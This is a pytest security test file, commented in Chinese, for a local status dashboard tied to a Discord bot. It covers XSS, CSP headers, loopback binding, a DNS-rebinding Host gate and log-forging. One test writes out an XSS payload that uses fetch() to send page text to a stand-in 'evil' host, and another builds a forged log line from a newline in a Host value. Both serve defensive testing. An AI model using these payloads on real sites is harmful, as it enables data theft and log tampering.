"""`dashboard_server.py` 的守門測試。

這個模組原本一支測試都沒有，而它是整個 repo 唯一會**開網路埠**的東西，端出去
的內容又正好是 Layer 1 明文禁止送進對話平台的那一類（PID、佇列內容、事件、
批次標籤）。
"""
from __future__ import annotations

import json
import re

import pytest
import sys
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "axiomatic"))

import dashboard_server as ds  # noqa: E402
import discord_bot as b  # noqa: E402


def test_status_values_never_reach_innerhtml():
    """`/api/status` 的值不得用字串內插塞進 `innerHTML`。

    這不是理論風險，整條路都是通的：
      `/run label:<文字>` → `_clean_batch_label`（只正規化空白、截 80 字）
      → `batch_label.txt` → `build_status()["label"]` → 前端。
    而 `/run` **不在** `_OWNER_ONLY_GROUPS` 裡，`_roles_configured()` 預設又是
    False，所以任何能在頻道發言的人都寫得到那個檔。
    `<img src=x onerror=fetch('//evil/'+document.body.innerText)>` 只要 60 字，
    原封不動通過清洗——然後在擁有者的瀏覽器裡以儀表板的來源執行，讀得到
    `/api/status` 的全部內容。
    """
    payload = "<img src=x onerror=fetch('//evil/'+document.body.innerText)>"
    assert b._clean_batch_label(payload) == payload, (
        "前提檢查：清洗函式本來就不會動 HTML；哪天它開始跳脫了，這支測試的"
        "理由要重寫，不要直接刪掉")
    assert len(payload) <= 80, "前提檢查：塞得進 80 字的上限"

    js = re.search(r"<script>(.*?)</script>", ds.HTML, re.S)
    assert js, "找不到儀表板的行內 script"
    body = js.group(1)
    # 值一律走 textContent；模板字串不得再用來組 HTML。
    assert "innerHTML" not in body, (
        "儀表板不得再用 innerHTML 組卡片——狀態值裡有使用者控制得到的字串")
    assert "textContent" in body, "值要用 textContent 設定"
    for bad in ("${v}", "${k}"):
        assert bad not in body, f"模板內插 {bad} 是那個注入點本身"


def test_security_headers_close_the_exfil_channel():
    """就算哪天又有東西被注進頁面，也不該送得出去。

    行內 script／style 讓 CSP 沒辦法封掉行內執行，但 `default-src 'none'` ＋
    `connect-src 'self'` 封的是**外送管道**：fetch 不到外部主機、也載不了外部
    圖片當信標。"""
    names = dict(ds.Handler._SECURITY_HEADERS)
    csp = names.get("Content-Security-Policy", "")
    assert "default-src 'none'" in csp, csp
    assert "connect-src 'self'" in csp, f"少了它就還能 fetch 到外部主機: {csp}"
    assert "frame-ancestors 'none'" in csp, csp
    assert names.get("X-Content-Type-Options") == "nosniff", names


def test_the_headers_are_actually_sent():
    """靜態檢查常數不夠——要確認它真的出現在回應裡（實際起一個伺服器打一次）。"""
    server = ThreadingHTTPServer(("127.0.0.1", 0), ds.Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        port = server.server_address[1]
        for path in ("/", "/api/status"):
            with urllib.request.urlopen(
                    f"http://127.0.0.1:{port}{path}", timeout=10) as resp:
                got = resp.headers.get("Content-Security-Policy")
                assert got and "connect-src 'self'" in got, (path, got)
                assert resp.headers.get("X-Content-Type-Options") == "nosniff"
                if path == "/api/status":
                    # 解析得動，而且真的是狀態物件。
                    payload = json.loads(resp.read().decode("utf-8"))
                    assert "webrunner" in payload, payload
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_only_loopback_counts_as_local():
    """綁在 loopback 以外要吵——這個儀表板沒有任何認證。

    `""` 與 `"0.0.0.0"` 是最容易誤設的兩個值（兩者都是**所有介面**），認不得
    的字串一律當成非 loopback：寧可多吵一次，也不要安靜地對整個網段開門。"""
    for host in ("127.0.0.1", "127.0.0.5", "::1", "localhost", " 127.0.0.1 "):
        assert ds._is_loopback(host) is True, host
    for host in ("", "0.0.0.0", "::", "*", "192.168.1.5", "10.0.0.2",
                 "example.invalid", None):
        assert ds._is_loopback(host) is False, host


def test_the_default_bind_is_loopback():
    """設定檔沒寫 / 寫空字串時的 fallback 必須是 loopback。

    `main()` 用 `str(cfg.get("host") or "127.0.0.1")`——`or` 這一手正好把
    `""`（＝所有介面）救回 loopback，不要把它「簡化」成 `cfg.get("host",
    "127.0.0.1")`，那會讓空字串直接綁上所有介面。"""
    import inspect
    source = inspect.getsource(ds.main)
    assert 'or "127.0.0.1"' in source, source
    assert "_is_loopback" in source, "非 loopback 的綁定必須留下警告"


# ===========================================================================
# 讀取層：`_read_ndjson_tail` 與 `_count_ndjson` 是兩件事
#
# 兩支長得幾乎一樣（都逐行 `json.loads`、都跳過壞行），差別只在最後一句：一個
# 回 `rows[-n:]`，一個回總數。`_count_ndjson` 的 docstring 明講了不能拿 tail 那
# 支去量佇列深度——Dorossi 的佇列檔是**整檔重寫**的，所以列數就是待處理深度，而
# 被 tail 截斷過的數字會在佇列長過上限之後**無聲地少報**。
#
# 少報的方向很糟：儀表板是拿來看「有沒有東西塞住」的，而塞住正是佇列變長的時候。
# ===========================================================================

def _ndjson(path: Path, rows: int, *, junk: bool = False) -> None:
    lines = [json.dumps({"i": i}) for i in range(rows)]
    if junk:
        lines.insert(1, "{ not json")
        lines.insert(2, "[1, 2, 3]")      # 合法 JSON 但不是物件
        lines.insert(3, "")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def test_the_tail_returns_only_the_last_n(tmp_path):
    path = tmp_path / "e.ndjson"
    _ndjson(path, 50)
    rows = ds._read_ndjson_tail(path, 10)
    assert len(rows) == 10
    assert rows[-1]["i"] == 49 and rows[0]["i"] == 40


def test_the_count_is_not_capped_by_the_tail_size(tmp_path):
    """這一支就是那個 docstring 在防的東西。

    佇列深度必須是**總數**。拿 tail 去量的話，佇列一旦長過上限，儀表板會停在
    那個上限不動——而那正是最需要看到真實數字的時候。
    """
    path = tmp_path / "q.ndjson"
    _ndjson(path, 137)
    assert ds._count_ndjson(path) == 137
    assert len(ds._read_ndjson_tail(path, 20)) == 20


def test_build_status_uses_count_for_depth_and_tail_for_events():
    """在原始碼上釘住接線，不然兩支互換也不會有人發現——數字照樣長得像數字。"""
    import ast
    import inspect
    tree = ast.parse(inspect.getsource(ds.build_status))
    wiring = {}
    for node in ast.walk(tree):
        if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)):
            continue
        if node.func.id in ("_count_ndjson", "_read_ndjson_tail") and node.args:
            wiring.setdefault(node.func.id, set()).add(ast.unparse(node.args[0]))
    assert "DOROSSI_QUEUE_FILE" in wiring.get("_count_ndjson", set()), wiring
    assert "DOROSSI_FAILED_QUEUE_FILE" in wiring.get("_count_ndjson", set()), wiring
    assert not (wiring.get("_read_ndjson_tail", set())
                & {"DOROSSI_QUEUE_FILE", "DOROSSI_FAILED_QUEUE_FILE"}), (
        "佇列深度被改成用 tail 量了——長過上限之後會無聲少報")


@pytest.mark.parametrize("fn", ["_read_ndjson_tail", "_count_ndjson"])
def test_a_malformed_line_does_not_lose_the_rest_of_the_file(tmp_path, fn):
    """記錄檔是別的行程一邊追加、我們一邊讀的，半寫入的最後一行很正常。"""
    path = tmp_path / "e.ndjson"
    _ndjson(path, 10, junk=True)
    got = getattr(ds, fn)(path, 100) if fn == "_read_ndjson_tail" else ds._count_ndjson(path)
    assert (len(got) if fn == "_read_ndjson_tail" else got) == 10


@pytest.mark.parametrize("fn, empty", [("_read_ndjson_tail", []),
                                       ("_count_ndjson", 0)])
def test_a_missing_file_reads_as_empty(tmp_path, fn, empty):
    assert getattr(ds, fn)(tmp_path / "nope.ndjson") == empty


@pytest.mark.parametrize("fn, empty", [("_read_ndjson_tail", []),
                                       ("_count_ndjson", 0)])
def test_a_directory_in_place_of_the_file_does_not_500(tmp_path, fn, empty):
    """`OSError` 要被接住——請求處理器沒接住的話整頁就停止更新。"""
    d = tmp_path / "as_dir.ndjson"
    d.mkdir()
    assert getattr(ds, fn)(d) == empty


# --- 其餘讀取 helper -------------------------------------------------------

def test_the_pid_file_is_read_as_an_int(tmp_path, monkeypatch):
    path = tmp_path / "webrunner.pid"
    path.write_text(" 4242 \n", encoding="utf-8")
    monkeypatch.setattr(ds, "WEBRUNNER_PID_FILE", path)
    assert ds._read_pid() == (4242, True)


def test_a_missing_pid_file_is_a_decided_answer(tmp_path, monkeypatch):
    """檔案不存在是**判定得出來**的「沒有在跑」，不是「不知道」。

    這一條要跟下面那些「讀不出來」的案例分開，否則看板會把一台乾淨的機器也顯示成
    unknown——那樣三態就退化成沒有資訊。
    """
    monkeypatch.setattr(ds, "WEBRUNNER_PID_FILE", tmp_path / "nope.pid")
    assert ds._read_pid() == (None, True)


@pytest.mark.parametrize("raw", ["", "   ", "abc", "12.5", "0x10"])
def test_a_garbled_pid_file_is_undecidable(tmp_path, monkeypatch, raw):
    """半寫入的 pid 檔不能變成一個假的行程編號——`alive` 會跟著說謊。

    而且它也**不是**「沒有在跑」：檔案在那裡，只是我們解析不出來。回報成
    「判不出來」，讓顯示層說 unknown。
    """
    path = tmp_path / "webrunner.pid"
    path.write_text(raw, encoding="utf-8")
    monkeypatch.setattr(ds, "WEBRUNNER_PID_FILE", path)
    assert ds._read_pid() == (None, False)


def test_an_undecodable_pid_file_is_undecidable(tmp_path, monkeypatch):
    """內容不是合法 UTF-8：`UnicodeDecodeError` 是 `ValueError` 的子類、**不是**
    `OSError`，所以只接 `OSError` 的寫法接不住它，會直接炸穿這支函式。"""
    path = tmp_path / "webrunner.pid"
    path.write_bytes(b"\xff\xfe\x00\x80")
    monkeypatch.setattr(ds, "WEBRUNNER_PID_FILE", path)
    assert ds._read_pid() == (None, False)   # 不得 raise


def test_the_dashboard_never_shows_unreadable_as_stopped(tmp_path, monkeypatch):
    """**這是這組修改真正要保證的性質**：判不出來不得在最後一步塌回「停止」。

    分三態卻在 `build_status` 裡用 `pid or 0` 塞回 `_pid_alive`，等於白分——
    所以這裡從 `build_status()` 的輸出去看，而不是只看 `_read_pid()`。
    """
    path = tmp_path / "webrunner.pid"
    monkeypatch.setattr(ds, "WEBRUNNER_PID_FILE", path)

    path.write_bytes(b"\xff\xfe\x00\x80")
    assert ds.build_status()["webrunner"]["alive"] is None, (
        "pid 檔讀不出來，看板卻報了一個確定的 True/False")

    # 反方向：檔案不存在時要明確是 False，不能也變成 unknown。
    path.unlink()
    assert ds.build_status()["webrunner"]["alive"] is False, (
        "機器上真的沒有在跑，卻顯示成 unknown——三態退化成沒有資訊")


def test_the_front_end_renders_all_three_states():
    """後端分了三態，前端也要分——否則資訊在最後一步被丟掉。

    這頁的 HTML/JS 是內嵌字串，沒有前端測試框架，所以用原始碼比對。判準刻意窄：
    只要求那一行同時處理 `null` 與真假兩種情況。
    """
    import inspect
    src = inspect.getsource(ds)
    line = [ln for ln in src.splitlines() if "'Background'" in ln]
    assert line, "找不到看板那一行——改過的話這支測試要跟著改"
    row = line[0]
    assert "null" in row, (
        f"前端沒有處理 `alive === null`，讀不出來會顯示成 stopped：{row.strip()}")
    assert "running" in row and "stopped" in row, (
        f"另外兩態不見了：{row.strip()}")


def test_a_missing_mtime_is_none_not_zero(tmp_path):
    """0 會被算成「1970 年以來的秒數」，也就是一個巨大的 log_age_sec。"""
    assert ds._safe_mtime(tmp_path / "nope") is None
    real = tmp_path / "yes"
    real.write_text("x", encoding="utf-8")
    assert isinstance(ds._safe_mtime(real), float)


def test_missing_text_reads_as_empty_string(tmp_path):
    assert ds._safe_text(tmp_path / "nope") == ""


@pytest.mark.parametrize("name, counted", [
    ("a.png", True), ("b.JPG", True), ("c.jpeg", True), ("d.webp", True),
    ("e.gif", True), ("f.txt", False), ("g", False), ("h.png.tmp", False),
])
def test_only_image_suffixes_are_counted(tmp_path, monkeypatch, name, counted):
    (tmp_path / name).write_text("x", encoding="utf-8")
    monkeypatch.setattr(ds, "OUTPUT_ROOT", tmp_path)
    assert ds._dir_image_count(tmp_path) == (1 if counted else 0)


def test_images_in_sub_folders_are_counted(tmp_path):
    (tmp_path / "char").mkdir()
    (tmp_path / "char" / "a.png").write_text("x", encoding="utf-8")
    assert ds._dir_image_count(tmp_path) == 1


def test_a_missing_output_tree_counts_zero(tmp_path):
    assert ds._dir_image_count(tmp_path / "nope") == 0


# ===========================================================================
# 請求處理：壞掉的時候要回 500，不能把 traceback 丟到連線上
# ===========================================================================

def _serve(handler_cls):
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler_cls)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


def _get(port, *, host_header, path="/api/status"):
    """帶指定 `Host` 標頭發一個請求，回 `(狀態碼, 內文)`。

    `urllib` 會自己填 `Host`，所以要明確覆寫才測得到這件事。
    """
    request = urllib.request.Request(f"http://127.0.0.1:{port}{path}")
    if host_header is not None:
        request.add_header("Host", host_header)
    try:
        with urllib.request.urlopen(request, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", "replace")


@pytest.mark.parametrize("raw, expected", [
    ("127.0.0.1:8765", "127.0.0.1"),
    ("127.0.0.1", "127.0.0.1"),
    ("[::1]:8765", "::1"),
    ("[::1]", "::1"),
    ("::1", "::1"),                 # 格式不合法，但別人送得出來
    ("evil.com:8765", "evil.com"),
    ("evil.com", "evil.com"),
    ("", ""),
])
def test_the_host_header_parser_strips_only_a_real_port(raw, expected):
    """`::1` 這一筆才是重點：冒號不是埠號分隔符的時候不能亂切。

    切錯的話一個 IP 字面值會變成空字串，而空字串是 fail-closed 的那一邊——
    判斷結果剛好反過來，合法的請求被擋、而且沒有人看得出為什麼。
    """
    assert ds._hostname_of(raw) == expected


@pytest.mark.parametrize("raw, allowed", [
    ("127.0.0.1:8765", True),
    ("[::1]:8765", True),
    ("192.168.1.50:8765", True),    # 刻意綁區網 IP 的用法不受影響
    ("localhost:8765", True),       # RFC 6761 特例名稱，攻擊者搶不到
    ("LocalHost:8765", True),       # 大小寫不敏感
    ("evil.com:8765", False),       # ← rebinding 走的就是這一條
    ("dashboard.internal:8765", False),
    ("", False),                    # 沒有 Host：fail-closed
    (None, False),
])
def test_only_an_ip_literal_or_localhost_passes_the_host_gate(raw, allowed):
    """判準是「**是不是一個名字**」，不是「是不是 loopback」。

    DNS rebinding 一定要靠一個攻擊者控制得了的名稱——瀏覽器送出的 `Host` 會是
    `evil.com:8765`。IP 字面值攻擊者拿不到，所以 IP 一律放行、名字一律擋掉。
    這樣既封掉整條路，又不必犧牲「刻意綁在區網 IP」這個合法設定。
    """
    assert ds._host_header_is_local(raw, frozenset()) is allowed


def test_the_configured_bind_name_is_still_allowed():
    """使用者自己在設定檔寫的名字要放行，否則這道閘會擋掉他預期的用法。"""
    extra = frozenset({"dashboard.internal"})
    assert ds._host_header_is_local("dashboard.internal:8765", extra) is True
    assert ds._host_header_is_local("evil.com:8765", extra) is False


def test_main_feeds_the_configured_host_into_the_gate():
    """上一支測的是純函式；這一支確認 `main()` 真的把設定值接上去。

    少了這一條接線，`extra_allowed_hosts` 永遠是空集合——而現況（綁
    `127.0.0.1`）下**完全沒有症狀**，因為 IP 字面值本來就放行。
    """
    import ast
    import inspect
    source = inspect.getsource(ds.main)
    assert "extra_allowed_hosts" in source, (
        "`main()` 沒有把設定檔綁的位址填進 `Handler.extra_allowed_hosts`")
    # 只是 import 得到不算數：確認那行真的是一個 assignment。
    tree = ast.parse(source)
    assigned = any(
        isinstance(node, ast.Assign)
        and any(isinstance(t, ast.Attribute) and t.attr == "extra_allowed_hosts"
                for t in node.targets)
        for node in ast.walk(tree))
    assert assigned, "`extra_allowed_hosts` 有被提到，但不是被指派"


def test_a_foreign_host_header_is_refused_end_to_end():
    """真的開一個埠、真的送一個攻擊者的 Host 進去。

    純函式測得再細，接線斷掉也是全綠——這支是唯一會因為「閘沒有被呼叫」而紅的。
    """
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        code, body = _get(port, host_header="evil.com")
        assert code == 403, f"攻擊者的 Host 竟然通過了：{code} {body[:200]!r}"
        # **回應不得回顯 Host 的內容**——那是攻擊者控制的字串，而這個回應
        # 正是他要讀走的東西。
        assert "evil.com" not in body, f"把 Host 回顯出去了：{body[:200]!r}"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_a_loopback_host_header_is_still_served_end_to_end():
    """正面對照組：擋掉全部也會讓上面那支通過。正常用法必須照樣可用。"""
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        code, body = _get(port, host_header=f"127.0.0.1:{port}")
        assert code == 200, f"正常的 loopback 請求被擋了：{code} {body[:200]!r}"
        assert json.loads(body), "回應不是可解析的狀態 JSON"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_the_host_gate_runs_before_the_status_is_built():
    """順序有意義：先驗 Host，再組狀態。

    反過來的話，即使最後回 403，`build_status()` 已經讀過 PID、佇列與事件了。
    這裡讓 `build_status` 直接爆炸——閘在前面就會拿到 403，閘在後面會拿到 500。
    """
    def _boom():
        raise AssertionError("build_status 不該在 Host 被拒時執行")

    original = ds.build_status
    ds.build_status = _boom
    try:
        server, thread = _serve(ds.Handler)
        try:
            port = server.server_address[1]
            code, _ = _get(port, host_header="evil.com")
            assert code == 403, (
                f"預期 403（閘先擋），實際 {code}——500 代表 `build_status()` "
                "在 Host 檢查之前就跑了")
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)
    finally:
        ds.build_status = original


def test_a_refusal_says_why_on_stderr(capfd):
    """擋掉卻不說為什麼，使用者只會看到一片空白的頁面。

    會撞上這裡的**合法**用法是真的存在的：刻意把 `dashboard.host` 設成
    `0.0.0.0` 綁所有介面，然後用主機名稱連進來——`Host: myhost:8765` 不是 IP
    字面值、不是 `localhost`、也不等於設定值，所以會被擋。沒有這行訊息的話，
    那個人查不出原因，而查不出原因的安全控制會被整個拔掉。
    """
    ds.Handler._refused_hosts = set()
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        code, _ = _get(port, host_header="myhost.example")
        assert code == 403
        err = capfd.readouterr().err
        assert "myhost.example" in err, f"沒說是哪個 Host 被擋：{err!r}"
        assert "dashboard.host" in err, "沒告訴使用者怎麼修"
    finally:
        ds.Handler._refused_hosts = set()
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_the_refusal_log_is_bounded(capfd):
    """攻擊者發得出無限多個請求，所以這行診斷**必須**封頂。

    沒有上限的話，我為了可用性加的這行自己就變成一個灌爆 log 的管道——而
    `discord_bot.log` 已經為了「同一句話洗掉真正的診斷」吃過一次虧。
    """
    ds.Handler._refused_hosts = set()
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        for i in range(12):
            assert _get(port, host_header=f"h{i}.example")[0] == 403
        err = capfd.readouterr().err
        printed = err.count("refused a request")
        assert printed <= ds.Handler._REFUSED_LOG_LIMIT, (
            f"12 個相異 Host 印了 {printed} 行，上限應該是 "
            f"{ds.Handler._REFUSED_LOG_LIMIT}")
        assert printed >= 1, "一行都沒印，等於沒有診斷"
        assert len(ds.Handler._refused_hosts) <= ds.Handler._REFUSED_LOG_LIMIT
    finally:
        ds.Handler._refused_hosts = set()
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_the_refusal_log_cannot_forge_a_log_line(capfd):
    """`Host` 是對方控制的字串，原樣印的話換行可以偽造出一整行假的 log。

    stderr 會進 log，而 `/log tail` 會把 log 送進對話平台——這條路是通的。
    `!r` 把換行變成字面的 `\n`，所以偽造不出來。
    """
    ds.Handler._refused_hosts = set()
    forged = "evil\r\n[09-09 00:00:00] batch finished cleanly"
    assert ds._host_header_is_local(forged, frozenset()) is False
    handler = ds.Handler.__new__(ds.Handler)
    handler.headers = {"Host": forged}
    try:
        assert handler._host_is_allowed() is False
        err = capfd.readouterr().err
        assert "\n[09-09" not in err, (
            f"換行原樣印出去了，可以偽造 log 行：{err!r}")
        assert "batch finished cleanly" in err, (
            "前提檢查：這個字串本來就該出現在訊息裡（只是要被跳脫）")
    finally:
        ds.Handler._refused_hosts = set()


def test_an_unknown_path_still_serves_the_page():
    """單一頁面應用：任何非 `/api/` 的路徑都給同一份 HTML，不要 404。"""
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        with urllib.request.urlopen(
                f"http://127.0.0.1:{port}/whatever", timeout=10) as resp:
            body = resp.read().decode("utf-8")
        assert resp.status == 200
        assert "<!doctype html>" in body.lower()
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_a_broken_status_answers_500_instead_of_dropping_the_connection(
        monkeypatch, capsys):
    """沒接住的話 `socketserver.handle_error` 會印 traceback 然後**斷線**，
    頁面就只是停止更新、一點線索都沒有。回 500 至少讓瀏覽器看得到。"""
    def _boom():
        raise RuntimeError("status exploded")

    monkeypatch.setattr(ds, "build_status", _boom)
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        try:
            urllib.request.urlopen(
                f"http://127.0.0.1:{port}/api/status", timeout=10)
            raise AssertionError("預期 500")
        except urllib.error.HTTPError as err:
            assert err.code == 500
            payload = json.loads(err.read().decode("utf-8"))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)
    assert payload == {"error": "status unavailable"}


def test_the_error_body_never_carries_the_exception_text(monkeypatch):
    """回應主體是泛用字串。原始例外只進 stderr——這個埠沒有認證，端出去的東西
    等於給任何連得到的人看，而例外文字會夾帶主機路徑。"""
    import ast
    import inspect
    import textwrap
    # `getsource` 給的是**方法**，帶著類別那一層縮排，直接 parse 會 IndentationError。
    tree = ast.parse(textwrap.dedent(inspect.getsource(ds.Handler.do_GET)))
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        name = ast.unparse(node.func)
        if name != "json.dumps":
            continue
        rendered = ast.unparse(node)
        assert "error" not in rendered or "status unavailable" in rendered or (
            "build_status" in rendered), rendered


def test_the_error_path_still_sends_the_security_headers(monkeypatch):
    """500 也是一份回應。少了標頭的話，注入的東西正好挑錯誤路徑走。"""
    monkeypatch.setattr(
        ds, "build_status",
        lambda: (_ for _ in ()).throw(RuntimeError("boom")))
    server, thread = _serve(ds.Handler)
    try:
        port = server.server_address[1]
        try:
            urllib.request.urlopen(
                f"http://127.0.0.1:{port}/api/status", timeout=10)
            raise AssertionError("預期 500")
        except urllib.error.HTTPError as err:
            assert err.headers.get("X-Content-Type-Options") == "nosniff"
            assert "default-src 'none'" in (
                err.headers.get("Content-Security-Policy") or "")
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_a_client_hangup_is_re_raised_not_turned_into_500():
    """寫到一半對方斷線是 `OSError`，那時候**已經沒有連線可以回 500 了**。

    當成一般例外去接的話會再寫一次、再炸一次，只是多一層雜訊。原始碼上釘住
    `except OSError: raise` 在泛用 handler 之前。
    """
    import ast
    import inspect
    import textwrap
    # `getsource` 給的是**方法**，帶著類別那一層縮排，直接 parse 會 IndentationError。
    tree = ast.parse(textwrap.dedent(inspect.getsource(ds.Handler.do_GET)))
    tries = [n for n in ast.walk(tree) if isinstance(n, ast.Try)]
    assert tries, "do_GET 不再有 try 了"
    kinds = [ast.unparse(h.type) if h.type else "bare"
             for h in tries[0].handlers]
    assert kinds[0] == "OSError", (
        f"第一個 handler 是 {kinds[0]}，OSError 必須排在泛用 handler 之前，"
        "否則對方斷線時會被當成內部錯誤再寫一次")
    assert any(isinstance(s, ast.Raise) for s in tries[0].handlers[0].body), (
        "OSError 那一支沒有重拋")
